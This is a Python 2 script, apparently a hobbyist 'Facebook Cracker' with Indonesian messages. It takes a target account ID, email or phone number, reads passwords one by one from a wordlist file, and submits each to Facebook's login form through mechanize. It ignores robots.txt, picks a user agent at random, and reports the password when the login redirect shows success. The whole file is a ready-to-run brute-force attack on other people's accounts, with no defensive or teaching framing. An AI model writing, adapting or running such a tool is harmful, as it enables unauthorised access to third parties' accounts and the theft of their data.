#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import os
import sys
import mechanize
import cookielib
import random


##### LOGO #####
logo = """\033[1;93m_/﹋\_          
\033[1;34m(🌀🌀)\033[0m
\033[1;36m<,︻╦╤─ ҉ ------------\033[0m \033[1;93m*Crack Facebook*\033[0m
\033[1;36m_/﹋\_\033[0m
\033[1;31m╔════════════════════════════════════════╗
\033[1;31m║ \033[1;93m*Author :\033[0m \033[1;97mUPIL FACEBOOK \033[0m               \033[1;31m║
\033[1;31m║ \033[1;93m*Github :\033[0m \033[1;34mhttps://github.com/aryhas\033[0m    \033[1;31m║
\033[1;31m╚════════════════════════════════════════╝\033[0m"""


os.system('clear')
print logo
print "\033[1;96m    \033[1;93m◆\033[1;31m ⃟ ⃟ \033[1;34m░▒▓ \033[1;93mFACEBOOK CRACKER \033[1;34m▓▒░\033[1;31m ⃟ ⃟ \033[1;93m◆     \033[1;96m"
print 42*"\033[1;96m="
email = str(raw_input("\033[1;96m[+] \033[1;93mID/Email/No_HP \033[1;97m: "))
password = str(raw_input("\033[1;96m[+] \033[1;93mPasword \033[1;97m: "))
print 42*"\033[1;96m="

login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	search()
	print("\033[1;31mPassword Tidak Keluar Dari List")

	
	
def brute(password):
	sys.stdout.write("\r\033[1;96m[*] \033[1;34mCoba Password \033[1;93m👉 {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n\033[1;96m[+] \033[1;93mPassword yang Cocok \033[1;97m👉 {}".format(password))
			raw_input("\033[1;31m[KELUAR]....")
			sys.exit(1)

			
def search():
	global password
	passwords = open('pass.txt', 'r')
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
total = open('pass.txt', 'r')
total = total.readlines()
print "\033[1;96m[*] \033[1;93mTarget Akun FB \033[1;97m: {}".format(email)
print "\033[1;96m[*] \033[1;34mMemuat \033[1;97m:" , len(total), "\033[1;93mpasswords"
print "\033[1;96m[*] \033[1;31mMohon Tunggu ..."
print 42*"\033[1;96m="
	
if __name__ == '__main__':
	main()
